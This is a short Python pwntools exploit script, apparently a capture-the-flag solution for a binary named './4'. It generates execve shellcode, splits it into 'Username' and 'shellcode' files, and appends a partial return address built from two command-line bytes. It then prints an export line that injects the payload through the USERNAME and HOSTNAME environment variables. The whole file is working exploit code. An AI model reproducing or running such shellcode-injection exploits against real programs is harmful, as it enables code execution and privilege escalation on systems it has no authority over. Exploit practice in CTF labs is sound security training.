from pwn import *
import sys

exe = ELF("./4")

context.binary = exe
context.arch = 'amd64'

shellcode = shellcraft.execve("/usr/local/bin/l33t", ["/usr/local/bin/l33t"], 0)
shellcode = asm(shellcode)


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r, gdbscript="")
    else:
        r = remote("addr", 1337)
    return r


def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <hex1> <hex2>")
        sys.exit(1)

    # Convert command line hex arguments to bytes
    byte1 = int(sys.argv[1], 16).to_bytes(1, 'little')
    byte2 = int(sys.argv[2], 16).to_bytes(1, 'little')

    addr = byte1 + byte2 + b'\xff\xff\xff\x7f'

    data = shellcode[40:] + b"A"*2 + addr

    with open("shellcode", "wb") as f:
        f.write(data)
    with open("Username", "wb") as f:
        f.write(shellcode[:40])
    
    print('export USERNAME="$(cat Username)" HOSTNAME="$(cat shellcode)"')



if __name__ == "__main__":
    main()
